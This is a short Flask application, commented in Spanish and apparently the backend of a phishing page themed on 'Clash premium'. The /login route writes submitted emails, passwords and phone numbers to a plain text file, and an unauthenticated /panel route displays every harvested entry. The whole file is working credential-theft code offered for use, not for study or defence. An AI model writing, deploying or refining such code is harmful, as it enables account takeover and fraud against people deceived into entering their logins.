from flask import Flask, render_template, request, redirect, session
import os

app = Flask(__name__, template_folder='templates')
app.secret_key = 'clave_secreta_clash_premium_999'

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/login', methods=['POST'])
def login():
    # Captura los datos del formulario de la Página 1
    correo = request.form.get('correo') or request.form.get('email')
    password = request.form.get('password') or request.form.get('contraseña')
    telefono = request.form.get('telefono')
    
    if correo and password:
        with open('datos.txt', 'a') as f:
            f.write(f"{correo}|{password}|{telefono}\n")
            
    return redirect('/panel')

@app.route('/panel')
def panel():
    datos = []
    if os.path.exists('datos.txt'):
        with open('datos.txt', 'r') as f:
            # Lee cada línea del archivo de datos
            datos = [linea.strip() for linea in f.readlines() if linea.strip()]
            
    return render_template('panel.html', datos=datos)

@app.route('/logout')
def logout():
    session.clear()
    return redirect('/')

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)

